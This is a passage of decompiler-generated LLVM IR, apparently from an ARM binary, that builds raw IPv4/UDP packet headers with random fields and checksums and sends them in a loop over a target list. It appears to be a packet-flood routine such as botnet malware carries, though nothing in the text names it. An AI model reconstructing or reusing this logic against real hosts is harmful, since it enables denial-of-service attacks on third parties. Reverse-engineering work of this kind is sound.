  %v1_ab08 = load i32, i32* %r4.global-to-local, align 4
  %v2_ab08 = add i32 %v1_ab08, 16
  %v3_ab08 = inttoptr i32 %v2_ab08 to i32*
  store i32 %v3_ab00, i32* %v3_ab08, align 4
  %v0_ab0c = load i32, i32* %r4.global-to-local, align 4
  %v1_ab0c = add i32 %v0_ab0c, 24
  store i32 %v1_ab0c, i32* %r1.global-to-local, align 4
  %v1_ab10 = add i32 %v0_ab0c, 20
  store i32 %v1_ab10, i32* %r0.global-to-local, align 4
  %v0_ab14 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab14 = add i32 %v0_ab14, 101
  store i32 %v1_ab14, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v0_ab20 = load i32, i32* @r8, align 4
  %v1_ab20 = trunc i32 %v0_ab20 to i16
  %v3_ab20 = add i32 %v0_ab0c, 2
  %v4_ab20 = inttoptr i32 %v3_ab20 to i16*
  store i16 %v1_ab20, i16* %v4_ab20, align 2
  %v0_ab24 = load i32, i32* %ip.global-to-local, align 4
  %v1_ab24 = trunc i32 %v0_ab24 to i16
  %v2_ab24 = load i32, i32* %r0.global-to-local, align 4
  %v3_ab24 = add i32 %v2_ab24, 2
  %v4_ab24 = inttoptr i32 %v3_ab24 to i16*
  store i16 %v1_ab24, i16* %v4_ab24, align 2
  %v0_ab28 = load i32, i32* %r3.global-to-local, align 4
  %v1_ab28 = trunc i32 %v0_ab28 to i8
  %v2_ab28 = load i32, i32* %r1.global-to-local, align 4
  %v3_ab28 = add i32 %v2_ab28, 13
  %v4_ab28 = inttoptr i32 %v3_ab28 to i8*
  store i8 %v1_ab28, i8* %v4_ab28, align 1
  %v0_ab2c = load i32, i32* %r2.global-to-local, align 4
  %v1_ab2c = trunc i32 %v0_ab2c to i8
  %v2_ab2c = load i32, i32* %r1.global-to-local, align 4
  %v3_ab2c = add i32 %v2_ab2c, 12
  %v4_ab2c = inttoptr i32 %v3_ab2c to i8*
  store i8 %v1_ab2c, i8* %v4_ab2c, align 1
  %v0_ab30 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab30 = add i32 %v0_ab30, 38
  %v2_ab30 = inttoptr i32 %v1_ab30 to i8*
  %v3_ab30 = load i8, i8* %v2_ab30, align 1
  %tmp89 = urem i8 %v3_ab30, 16
  %v1_ab34 = zext i8 %tmp89 to i32
  %v1_ab38 = or i32 %v1_ab34, 64
  store i32 %v1_ab38, i32* %r3.global-to-local, align 4
  %v1_ab3c = trunc i32 %v1_ab38 to i8
  store i8 %v1_ab3c, i8* %v2_ab30, align 1
  %v0_ab40 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab40 = add i32 %v0_ab40, 38
  %v2_ab40 = inttoptr i32 %v1_ab40 to i8*
  %v3_ab40 = load i8, i8* %v2_ab40, align 1
  %v1_ab44 = and i8 %v3_ab40, -16
  %v1_ab48 = or i8 %v1_ab44, 5
  store i8 %v1_ab48, i8* %v2_ab40, align 1
  %v0_ab54 = load i32, i32* %r4.global-to-local, align 4
  %v1_ab54 = add i32 %v0_ab54, 38
  store i32 %v1_ab54, i32* @r5, align 4
  %v3_ab58 = add i32 %v0_ab54, 39
  %v4_ab58 = inttoptr i32 %v3_ab58 to i8*
  store i8 %v5_a864, i8* %v4_ab58, align 1
  store i32 %v5_aa54, i32* %r2.global-to-local, align 4
  %v2_ab60 = load i32, i32* @r5, align 4
  %v3_ab60 = add i32 %v2_ab60, 2
  %v4_ab60 = inttoptr i32 %v3_ab60 to i16*
  store i16 %v5_aa68, i16* %v4_ab60, align 2
  store i32 %v4_ab64, i32* %r3.global-to-local, align 4
  store i32 %v1_a888, i32* %r1.global-to-local, align 4
  %v0_ab6c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ab6c, label %.thread26, label %bb83

.thread26:                                        ; preds = %.thread25
  %v2_ab7028 = load i32, i32* @r5, align 4
  %v3_ab7029 = add i32 %v2_ab7028, 4
  %v4_ab7030 = inttoptr i32 %v3_ab7029 to i16*
  store i16 %v1_ab7027, i16* %v4_ab7030, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  br label %bb84

bb83:                                             ; preds = %.thread25
  store i32 64, i32* %r2.global-to-local, align 4
  %v2_ab70 = load i32, i32* @r5, align 4
  %v3_ab70 = add i32 %v2_ab70, 4
  %v4_ab70 = inttoptr i32 %v3_ab70 to i16*
  store i16 %v1_ab7027, i16* %v4_ab70, align 2
  store i32 17, i32* %r3.global-to-local, align 4
  %v1_ab78 = load i32, i32* %r2.global-to-local, align 4
  %v2_ab78 = trunc i32 %v1_ab78 to i16
  %v3_ab78 = load i32, i32* @r5, align 4
  %v4_ab78 = add i32 %v3_ab78, 6
  %v5_ab78 = inttoptr i32 %v4_ab78 to i16*
  store i16 %v2_ab78, i16* %v5_ab78, align 2
  br label %bb84

bb84:                                             ; preds = %.thread26, %bb83
  %v0_ab7c = load i32, i32* %r1.global-to-local, align 4
  %v1_ab7c = trunc i32 %v0_ab7c to i8
  %v2_ab7c = load i32, i32* @r5, align 4
  %v3_ab7c = add i32 %v2_ab7c, 8
  %v4_ab7c = inttoptr i32 %v3_ab7c to i8*
  store i8 %v1_ab7c, i8* %v4_ab7c, align 1
  %v0_ab80 = load i32, i32* %r3.global-to-local, align 4
  %v1_ab80 = trunc i32 %v0_ab80 to i8
  %v2_ab80 = load i32, i32* @r5, align 4
  %v3_ab80 = add i32 %v2_ab80, 9
  %v4_ab80 = inttoptr i32 %v3_ab80 to i8*
  store i8 %v1_ab80, i8* %v4_ab80, align 1
  %v0_ab84 = call i32 @function_f700()
  store i32 %v0_ab84, i32* %r0.global-to-local, align 4
  store i32 %v1_a9a4, i32* %r1.global-to-local, align 4
  store i1 %v2_ab90, i1* %cpsr_z.global-to-local, align 1
  %v1_ab94 = sub i32 1023, %v0_ab84
  store i32 %v1_ab94, i32* %r3.global-to-local, align 4
  br i1 %v2_ab90, label %.thread, label %.thread10

.thread:                                          ; preds = %bb84
  %v2_ab9c = load i32, i32* @r5, align 4
  %v3_ab9c = add i32 %v2_ab9c, 16
  %v4_ab9c = inttoptr i32 %v3_ab9c to i32*
  store i32 %v1_ab94, i32* %v4_ab9c, align 4
  br label %bb85

.thread10:                                        ; preds = %bb84
  %v1_ab98 = load i32, i32* %r4.global-to-local, align 4
  %v2_ab98 = add i32 %v1_ab98, 16
  %v3_ab98 = inttoptr i32 %v2_ab98 to i32*
  %v4_ab98 = load i32, i32* %v3_ab98, align 4
  store i32 %v4_ab98, i32* %r3.global-to-local, align 4
  %v2_aba0 = load i32, i32* @r5, align 4
  %v3_aba0 = add i32 %v2_aba0, 16
  %v4_aba0 = inttoptr i32 %v3_aba0 to i32*
  store i32 %v4_ab98, i32* %v4_aba0, align 4
  br label %bb85

bb85:                                             ; preds = %.thread, %.thread10
  %v1_aba4 = load i32, i32* @r5, align 4
  %v2_aba4 = add i32 %v1_aba4, 12
  %v3_aba4 = inttoptr i32 %v2_aba4 to i32*
  store i32 %v0_ab84, i32* %v3_aba4, align 4
  %v3_aba8 = load i32, i32* %stack_var_-44, align 4
  %v0_abac = load i32, i32* %r4.global-to-local, align 4
  %v1_abac = add i32 %v0_abac, 58
  store i32 %v1_abac, i32* @r6, align 4
  store i32 %v4_abb0, i32* %r2.global-to-local, align 4
  %v1_abb4 = add i32 %v3_aba8, 1
  store i32 %v1_abb4, i32* @r4, align 4
  store i32 %v4_abb8, i32* %r3.global-to-local, align 4
  %v1_abbc = load i32, i32* @sl, align 4
  %v9_abbc = icmp eq i32 %v1_abb4, %v1_abbc
  store i1 %v9_abbc, i1* %cpsr_z.global-to-local, align 1
  %v0_abc0 = load i32, i32* @r7, align 4
  %v1_abc0 = trunc i32 %v0_abc0 to i16
  %v3_abc0 = add i32 %v0_abac, 62
  %v4_abc0 = inttoptr i32 %v3_abc0 to i16*
  store i16 %v1_abc0, i16* %v4_abc0, align 2
  %v0_abc4 = load i32, i32* %r2.global-to-local, align 4
  %v1_abc4 = trunc i32 %v0_abc4 to i16
  %v2_abc4 = load i32, i32* @r6, align 4
  %v3_abc4 = inttoptr i32 %v2_abc4 to i16*
  store i16 %v1_abc4, i16* %v3_abc4, align 2
  %v0_abc8 = load i32, i32* %r3.global-to-local, align 4
  %v1_abc8 = trunc i32 %v0_abc8 to i16
  %v2_abc8 = load i32, i32* @r6, align 4
  %v3_abc8 = add i32 %v2_abc8, 2
  %v4_abc8 = inttoptr i32 %v3_abc8 to i16*
  store i16 %v1_abc8, i16* %v4_abc8, align 2
  %v0_abcc = load i32, i32* @r4, align 4
  store i32 %v0_abcc, i32* %stack_var_-44, align 4
  %v5_abd0 = icmp slt i32 %v1_abb4, %v1_abbc
  br i1 %v5_abd0, label %dec_label_pc_aa78, label %dec_label_pc_abd4

dec_label_pc_abd4:                                ; preds = %bb85
  %v1_abdc = add i32 %v5_a8f8, 8
  store i32 %v1_abdc, i32* %r4.global-to-local, align 4
  %v1_abe0 = add i32 %v5_a8f8, 66
  store i32 %v1_abe0, i32* %r5.global-to-local, align 4
  %v0_abf0.pre.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_abec.preheader

dec_label_pc_abec.preheader:                      ; preds = %dec_label_pc_abd4, %dec_label_pc_ae84
  %v0_abf0.pre = phi i32 [ %v0_abf0.pre.pre, %dec_label_pc_abd4 ], [ 0, %dec_label_pc_ae84 ]
  %stack_var_-132.0.ph = phi i32 [ %v1_abe0, %dec_label_pc_abd4 ], [ %v1_ae90, %dec_label_pc_ae84 ]
  %stack_var_-136.0.ph = phi i32 [ %v1_abdc, %dec_label_pc_abd4 ], [ %v1_ae8c, %dec_label_pc_ae84 ]
  %v2_ae40 = icmp eq i32 %v1_a9a4, 0
  %v2_ac88 = ptrtoint i32* %stack_var_-48 to i32
  %v2_aca0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_acb0 = ptrtoint i32* %stack_var_-56 to i32
  %v2_acbc = ptrtoint i32* %stack_var_-54 to i32
  %v2_acd0 = icmp eq i32 %v1_a918, 0
  %v2_ac30 = icmp eq i32 %v5_a94c, -1
  %v7_ac30 = icmp eq i32 %v5_a94c, -1
  br label %dec_label_pc_abec

dec_label_pc_abec:                                ; preds = %dec_label_pc_abec, %dec_label_pc_acd8, %dec_label_pc_abec.preheader
  %v0_abf0 = phi i32 [ %v0_abf0.pre, %dec_label_pc_abec.preheader ], [ 0, %dec_label_pc_abec ], [ %v1_ad74, %dec_label_pc_acd8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_abf0 = icmp eq i32 %v0_abf0, 0
  store i1 %v2_abf0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_abf0, label %dec_label_pc_abec, label %dec_label_pc_abfc

dec_label_pc_abfc:                                ; preds = %dec_label_pc_abec
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ac00

dec_label_pc_ac00:                                ; preds = %dec_label_pc_acd8, %dec_label_pc_abfc
  %v1_ac14 = phi i32 [ %v1_ad70, %dec_label_pc_acd8 ], [ 0, %dec_label_pc_abfc ]
  %v5_ac04 = mul i32 %v1_ac14, 24
  %v1_ac08 = load i32, i32* @sb, align 4
  %v2_ac08 = add i32 %v1_ac08, %v5_ac04
  store i32 %v2_ac08, i32* %r3.global-to-local, align 4
  store i32 %v2_a82c, i32* %r4.global-to-local, align 4
  %v1_ac10 = add i32 %v2_ac08, 20
  %v2_ac10 = inttoptr i32 %v1_ac10 to i8*
  %v3_ac10 = load i8, i8* %v2_ac10, align 1
  %v4_ac10 = zext i8 %v3_ac10 to i32
  store i32 %v4_ac10, i32* %r2.global-to-local, align 4
  %v4_ac14 = mul i32 %v1_ac14, 4
  %v5_ac14 = add i32 %v4_ac14, %v2_a82c
  %v6_ac14 = inttoptr i32 %v5_ac14 to i32*
  %v7_ac14 = load i32, i32* %v6_ac14, align 4
  store i32 %v7_ac14, i32* @r5, align 4
  %v7_ac18 = icmp eq i8 %v3_ac10, 31
  store i1 %v7_ac18, i1* %cpsr_z.global-to-local, align 1
  %v1_ac1c = add i32 %v7_ac14, 24
  store i32 %v1_ac1c, i32* @r7, align 4
  %v1_ac20 = add i32 %v7_ac14, 38
  store i32 %v1_ac20, i32* @r6, align 4
  %v1_ac24 = add i32 %v7_ac14, 58
  store i32 %v1_ac24, i32* @r8, align 4
  %tmp90 = icmp ult i8 %v3_ac10, 32
  br i1 %tmp90, label %dec_label_pc_ad84, label %dec_label_pc_ac2c

dec_label_pc_ac2c:                                ; preds = %dec_label_pc_ac00
  store i32 %v5_a94c, i32* %r1.global-to-local, align 4
  store i1 %v7_ac30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ac30, label %dec_label_pc_ade4, label %dec_label_pc_ac38

dec_label_pc_ac38:                                ; preds = %dec_label_pc_ad84, %dec_label_pc_ac2c
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_ac40 = load i32, i32* @fp, align 4
  %v9_ac40 = icmp eq i32 %v0_ac40, 65535
  store i1 %v9_ac40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac40, label %dec_label_pc_adfc, label %dec_label_pc_ac48

dec_label_pc_ac48:                                ; preds = %dec_label_pc_ade4.dec_label_pc_ac48_crit_edge, %dec_label_pc_ac38
  %v1_ac4c = phi i32 [ %v1_ac4c.pre, %dec_label_pc_ade4.dec_label_pc_ac48_crit_edge ], [ 65535, %dec_label_pc_ac38 ]
  store i32 %v3_a9ac, i32* %r2.global-to-local, align 4
  %v9_ac4c = icmp eq i32 %v3_a9ac, %v1_ac4c
  store i1 %v9_ac4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac4c, label %dec_label_pc_ae24, label %dec_label_pc_ac54

dec_label_pc_ac54:                                ; preds = %dec_label_pc_adfc.dec_label_pc_ac54_crit_edge, %dec_label_pc_ac48
  %v1_ac58 = phi i32 [ %v1_ac58.pre, %dec_label_pc_adfc.dec_label_pc_ac54_crit_edge ], [ %v1_ac4c, %dec_label_pc_ac48 ]
  store i32 %v3_a9b0, i32* %r3.global-to-local, align 4
  %v9_ac58 = icmp eq i32 %v3_a9b0, %v1_ac58
  store i1 %v9_ac58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ac58, label %dec_label_pc_ae38, label %dec_label_pc_ac60

dec_label_pc_ac60:                                ; preds = %dec_label_pc_ae24, %dec_label_pc_ac54
  store i32 %v1_a9a4, i32* @r4, align 4
  store i1 %v2_ae40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae40, label %dec_label_pc_ae54, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_ac60
  %v1_ac68 = load i32, i32* @r5, align 4
  %v2_ac68 = add i32 %v1_ac68, 16
  %v3_ac68 = inttoptr i32 %v2_ac68 to i32*
  %v4_ac68 = load i32, i32* %v3_ac68, align 4
  store i32 %v4_ac68, i32* %r3.global-to-local, align 4
  %v2_ac6c = load i32, i32* @r6, align 4
  %v3_ac6c = add i32 %v2_ac6c, 16
  %v4_ac6c = inttoptr i32 %v3_ac6c to i32*
  store i32 %v4_ac68, i32* %v4_ac6c, align 4
  br label %dec_label_pc_ac74

dec_label_pc_ac74:                                ; preds = %bb88, %.thread11, %dec_label_pc_ae54
  %v0_ac74 = call i32 @function_f700()
  store i32 %v0_ac74, i32* %r0.global-to-local, align 4
  store i32 %v0_ac74, i32* %stack_var_-48, align 4
  %v0_ac7c = call i32 @function_f700()
  store i32 %v0_ac7c, i32* %r0.global-to-local, align 4
  store i32 %v0_ac7c, i32* %stack_var_-52, align 4
  %v0_ac84 = call i32 @function_f700()
  store i32 %v2_ac88, i32* %r1.global-to-local, align 4
  store i32 %v0_ac84, i32* %stack_var_-56, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_ac94 = load i32, i32* @r7, align 4
  store i32 %v0_ac94, i32* %r0.global-to-local, align 4
  %v3_ac98 = call i32 @function_124f0(i32 %v0_ac94, i32 %v2_ac88, i32 4)
  %v0_ac9c = load i32, i32* @r7, align 4
  %v1_ac9c = add i32 %v0_ac9c, 6
  store i32 %v1_ac9c, i32* %r0.global-to-local, align 4
  store i32 %v2_aca0, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v3_aca8 = call i32 @function_124f0(i32 %v1_ac9c, i32 %v2_aca0, i32 4)
  %v0_acac = load i32, i32* @r7, align 4
  %v1_acac = add i32 %v0_acac, 4
  store i32 %v1_acac, i32* %r0.global-to-local, align 4
  store i32 %v2_acb0, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_acb8 = call i32 @function_124f0(i32 %v1_acac, i32 %v2_acb0, i32 2)
  store i32 %v2_acbc, i32* %r1.global-to-local, align 4
  %v0_acc0 = load i32, i32* @r7, align 4
  %v1_acc0 = add i32 %v0_acc0, 10
  store i32 %v1_acc0, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v3_acc8 = call i32 @function_124f0(i32 %v1_acc0, i32 %v2_acbc, i32 2)
  store i32 %v3_acc8, i32* %r0.global-to-local, align 4
  store i32 %v1_a918, i32* %r1.global-to-local, align 4
  store i1 %v2_acd0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_acd0, label %dec_label_pc_acd8, label %dec_label_pc_ae60

dec_label_pc_acd8:                                ; preds = %dec_label_pc_ac74, %dec_label_pc_ae60
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_acdc = load i32, i32* @r5, align 4
  %v3_acdc = add i32 %v2_acdc, 10
  %v4_acdc = inttoptr i32 %v3_acdc to i16*
  store i16 0, i16* %v4_acdc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_ace4 = load i32, i32* @r5, align 4
  store i32 %v0_ace4, i32* @r0, align 4
  %v2_ace8 = call i32 @function_dc98(i32 %v0_ace4, i32 20)
  %v3_ace8 = trunc i32 %v2_ace8 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_acf0 = load i32, i32* @r5, align 4
  %v4_acf0 = add i32 %v3_acf0, 10
  %v5_acf0 = inttoptr i32 %v4_acf0 to i16*
  store i16 %v3_ace8, i16* %v5_acf0, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_acf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_acf8 = trunc i32 %v0_acf8 to i16
  %v2_acf8 = load i32, i32* @r6, align 4
  %v3_acf8 = add i32 %v2_acf8, 10
  %v4_acf8 = inttoptr i32 %v3_acf8 to i16*
  store i16 %v1_acf8, i16* %v4_acf8, align 2
  %v0_acfc = load i32, i32* @r6, align 4
  store i32 %v0_acfc, i32* @r0, align 4
  %v2_ad00 = call i32 @function_dc98(i32 %v0_acfc, i32 20)
  %v3_ad00 = trunc i32 %v2_ad00 to i16
  store i32 %v2_ad00, i32* %r0.global-to-local, align 4
  %v3_ad04 = load i32, i32* @r6, align 4
  %v4_ad04 = add i32 %v3_ad04, 10
  %v5_ad04 = inttoptr i32 %v4_ad04 to i16*
  store i16 %v3_ad00, i16* %v5_ad04, align 2
  store i32 0, i32* @r4, align 4
  %v0_ad0c = load i32, i32* @r8, align 4
  store i32 %v0_ad0c, i32* @r1, align 4
  %v1_ad10 = add i32 %v0_ad0c, 4
  %v2_ad10 = inttoptr i32 %v1_ad10 to i16*
  %v3_ad10 = load i16, i16* %v2_ad10, align 2
  %v4_ad10 = zext i16 %v3_ad10 to i32
  store i32 %v4_ad10, i32* %r2.global-to-local, align 4
  store i32 %stack_var_-136.0.ph, i32* %r3.global-to-local, align 4
  %v3_ad18 = add i32 %v0_ad0c, 6
  %v4_ad18 = inttoptr i32 %v3_ad18 to i16*
  store i16 0, i16* %v4_ad18, align 2
  %v0_ad1c = load i32, i32* @r6, align 4
  store i32 %v0_ad1c, i32* %r0.global-to-local, align 4
  %v4_ad20 = call i32 @function_dce8(i32 %v0_ad1c, i32 %v0_ad0c, i32 %v4_ad10, i32 %stack_var_-136.0.ph)
  %v5_ad20 = trunc i32 %v4_ad20 to i16
  store i32 %v4_ad20, i32* %r0.global-to-local, align 4
  %v3_ad24 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad24, i32* %r2.global-to-local, align 4
  %v3_ad28 = mul i32 %v3_ad24, 32
  store i32 %v3_ad28, i32* %r3.global-to-local, align 4
  %v0_ad2c = load i32, i32* @r5, align 4
  %v1_ad2c = add i32 %v0_ad2c, 16
  %v2_ad2c = inttoptr i32 %v1_ad2c to i32*
  %v3_ad2c = load i32, i32* %v2_ad2c, align 4
  %v5_ad30 = mul i32 %v3_ad24, 24
  store i32 %v5_ad30, i32* %r3.global-to-local, align 4
  %v1_ad34 = load i32, i32* @sb, align 4
  %v2_ad34 = add i32 %v1_ad34, %v5_ad30
  store i32 %v2_ad34, i32* @lr, align 4
  %v2_ad38 = add i32 %v2_ad34, 4
  %v3_ad38 = inttoptr i32 %v2_ad38 to i32*
  store i32 %v3_ad2c, i32* %v3_ad38, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_ad40 = load i32, i32* @r8, align 4
  %v4_ad40 = add i32 %v3_ad40, 6
  %v5_ad40 = inttoptr i32 %v4_ad40 to i16*
  store i16 %v5_ad20, i16* %v5_ad40, align 2
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ad48 = load i32, i32* %r1.global-to-local, align 4
  %v1_ad48 = trunc i32 %v0_ad48 to i16
  %v2_ad48 = load i32, i32* %r3.global-to-local, align 4
  %v3_ad48 = load i32, i32* @sb, align 4
  %v4_ad48 = add i32 %v3_ad48, %v2_ad48
  %v5_ad48 = inttoptr i32 %v4_ad48 to i16*
  store i16 %v1_ad48, i16* %v5_ad48, align 2
  %v0_ad4c = load i32, i32* @r4, align 4
  %v1_ad4c = trunc i32 %v0_ad4c to i16
  %v2_ad4c = load i32, i32* @lr, align 4
  %v3_ad4c = add i32 %v2_ad4c, 2
  %v4_ad4c = inttoptr i32 %v3_ad4c to i16*
  store i16 %v1_ad4c, i16* %v4_ad4c, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ad54 = load i32, i32* @r5, align 4
  store i32 %v0_ad54, i32* %r1.global-to-local, align 4
  store i32 %v3_a960, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-132.0.ph, i32* %r2.global-to-local, align 4
  %v0_ad60 = load i32, i32* @lr, align 4
  %v0_ad64 = load i32, i32* %ip.global-to-local, align 4
  %v6_ad68 = call i32 @function_138bc(i32 %v3_a960, i32 %v0_ad54, i32 %stack_var_-132.0.ph, i32 16384, i32 %v0_ad60, i32 %v0_ad64)
  %v3_ad6c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ad6c, i32* %r3.global-to-local, align 4
  %v1_ad70 = add i32 %v3_ad6c, 1
  store i32 %v1_ad70, i32* %r0.global-to-local, align 4
  %v1_ad74 = load i32, i32* @sl, align 4
  %v9_ad74 = icmp eq i32 %v1_ad70, %v1_ad74
  store i1 %v9_ad74, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ad70, i32* %stack_var_-44, align 4
  %v6_ad7c = icmp slt i32 %v1_ad70, %v1_ad74
  br i1 %v6_ad7c, label %dec_label_pc_ac00, label %dec_label_pc_abec

dec_label_pc_ad84:                                ; preds = %dec_label_pc_ac00
  %v1_ad84 = add i32 %v2_ac08, 16
  %v2_ad84 = inttoptr i32 %v1_ad84 to i32*
  %v3_ad84 = load i32, i32* %v2_ad84, align 4
  store i32 %v3_ad84, i32* %r4.global-to-local, align 4
  %v0_ad88 = call i32 @function_f700()
  store i32 %v0_ad88, i32* %r0.global-to-local, align 4
  %v3_ad8c = load i32, i32* %stack_var_-44, align 4
  %v5_ad94 = mul i32 %v3_ad8c, 24
  %v0_ad98 = load i32, i32* %r4.global-to-local, align 4
  %v1_ad98 = and i32 %v0_ad98, 16711680
  store i32 %v1_ad98, i32* %ip.global-to-local, align 4
  %v3_ad9c = udiv i32 %v0_ad98, 16777216
  %v4_ada0 = udiv i32 %v1_ad98, 256
  %v5_ada0 = or i32 %v4_ada0, %v3_ad9c
  store i32 %v5_ada0, i32* %r2.global-to-local, align 4
  %v1_ada4 = load i32, i32* @sb, align 4
  %v2_ada4 = add i32 %v1_ada4, %v5_ad94
  store i32 %v2_ada4, i32* %r1.global-to-local, align 4
  %v1_ada8 = and i32 %v0_ad98, 65280
  store i32 %v1_ada8, i32* %r3.global-to-local, align 4
  %v1_adac = add i32 %v2_ada4, 20
  %v2_adac = inttoptr i32 %v1_adac to i8*
  %v3_adac = load i8, i8* %v2_adac, align 1
  %v4_adac = zext i8 %v3_adac to i32
  store i32 %v4_adac, i32* %ip.global-to-local, align 4
  %v5_adb4 = call i32 @llvm.bswap.i32(i32 %v0_ad98)
  %v7_adb8 = lshr i32 %v0_ad88, %v4_adac
  %v8_adb8 = add i32 %v7_adb8, %v5_adb4
  store i32 %v8_adb8, i32* %r2.global-to-local, align 4
  %v1_adbc = and i32 %v8_adb8, 16711680
  store i32 %v1_adbc, i32* %r0.global-to-local, align 4
  store i32 %v5_a94c, i32* %r1.global-to-local, align 4
  %v5_add4 = call i32 @llvm.bswap.i32(i32 %v8_adb8)
  store i32 %v5_add4, i32* %r3.global-to-local, align 4
  store i1 %v7_ac30, i1* %cpsr_z.global-to-local, align 1
  %v1_addc = load i32, i32* @r5, align 4
  %v2_addc = add i32 %v1_addc, 16
  %v3_addc = inttoptr i32 %v2_addc to i32*
  store i32 %v5_add4, i32* %v3_addc, align 4
  br i1 %v2_ac30, label %dec_label_pc_ade4, label %dec_label_pc_ac38

dec_label_pc_ade4:                                ; preds = %dec_label_pc_ad84, %dec_label_pc_ac2c
  %v0_ade4 = call i32 @function_f700()
  store i32 %v0_ade4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* %r4.global-to-local, align 4
  %v0_adf0 = load i32, i32* @fp, align 4
  %v9_adf0 = icmp eq i32 %v0_adf0, 65535
  store i1 %v9_adf0, i1* %cpsr_z.global-to-local, align 1
  %v1_adf4 = load i32, i32* @r5, align 4
  %v2_adf4 = add i32 %v1_adf4, 12
  %v3_adf4 = inttoptr i32 %v2_adf4 to i32*
  store i32 %v0_ade4, i32* %v3_adf4, align 4
  br i1 %v9_adf0, label %dec_label_pc_adfc, label %dec_label_pc_ade4.dec_label_pc_ac48_crit_edge

dec_label_pc_ade4.dec_label_pc_ac48_crit_edge:    ; preds = %dec_label_pc_ade4
  %v1_ac4c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac48

dec_label_pc_adfc:                                ; preds = %dec_label_pc_ade4, %dec_label_pc_ac38
  %v0_adfc = call i32 @function_f700()
  %v3_ae04 = urem i32 %v0_adfc, 65536
  store i32 %v3_ae04, i32* %r0.global-to-local, align 4
  store i32 %v3_a9ac, i32* %r2.global-to-local, align 4
  %v1_ae10 = sub nsw i32 999, %v3_ae04
  store i32 %v1_ae10, i32* %r3.global-to-local, align 4
  %v1_ae14 = load i32, i32* %r4.global-to-local, align 4
  %v9_ae14 = icmp eq i32 %v3_a9ac, %v1_ae14
  store i1 %v9_ae14, i1* %cpsr_z.global-to-local, align 1
  %v1_ae18 = trunc i32 %v0_adfc to i16
  %v2_ae18 = load i32, i32* @r5, align 4
  %v3_ae18 = add i32 %v2_ae18, 4
  %v4_ae18 = inttoptr i32 %v3_ae18 to i16*
  store i16 %v1_ae18, i16* %v4_ae18, align 2
  %v0_ae1c = load i32, i32* %r3.global-to-local, align 4
  %v1_ae1c = trunc i32 %v0_ae1c to i16
  %v2_ae1c = load i32, i32* @r6, align 4
  %v3_ae1c = add i32 %v2_ae1c, 4
  %v4_ae1c = inttoptr i32 %v3_ae1c to i16*
  store i16 %v1_ae1c, i16* %v4_ae1c, align 2
  br i1 %v9_ae14, label %dec_label_pc_ae24, label %dec_label_pc_adfc.dec_label_pc_ac54_crit_edge

dec_label_pc_adfc.dec_label_pc_ac54_crit_edge:    ; preds = %dec_label_pc_adfc
  %v1_ac58.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ac54

dec_label_pc_ae24:                                ; preds = %dec_label_pc_adfc, %dec_label_pc_ac48
  %v0_ae24 = call i32 @function_f700()
  %v1_ae24 = trunc i32 %v0_ae24 to i16
  store i32 %v0_ae24, i32* %r0.global-to-local, align 4
  store i32 %v3_a9b0, i32* %r3.global-to-local, align 4
  %v1_ae2c = load i32, i32* %r4.global-to-local, align 4
  %v9_ae2c = icmp eq i32 %v3_a9b0, %v1_ae2c
  store i1 %v9_ae2c, i1* %cpsr_z.global-to-local, align 1
  %v3_ae30 = load i32, i32* @r5, align 4
  %v4_ae30 = add i32 %v3_ae30, 58
  %v5_ae30 = inttoptr i32 %v4_ae30 to i16*
  store i16 %v1_ae24, i16* %v5_ae30, align 2
  br i1 %v9_ae2c, label %dec_label_pc_ae38, label %dec_label_pc_ac60

dec_label_pc_ae38:                                ; preds = %dec_label_pc_ae24, %dec_label_pc_ac54
  %v0_ae38 = call i32 @function_f700()
  %v1_ae38 = trunc i32 %v0_ae38 to i16
  store i32 %v0_ae38, i32* %r0.global-to-local, align 4
  store i32 %v1_a9a4, i32* @r4, align 4
  store i1 %v2_ae40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ae40, label %.thread31, label %bb88

.thread31:                                        ; preds = %dec_label_pc_ae38
  %v3_ae4832 = load i32, i32* @r8, align 4
  %v4_ae4833 = add i32 %v3_ae4832, 2
  %v5_ae4834 = inttoptr i32 %v4_ae4833 to i16*
  store i16 %v1_ae38, i16* %v5_ae4834, align 2
  br label %dec_label_pc_ae54

bb88:                                             ; preds = %dec_label_pc_ae38
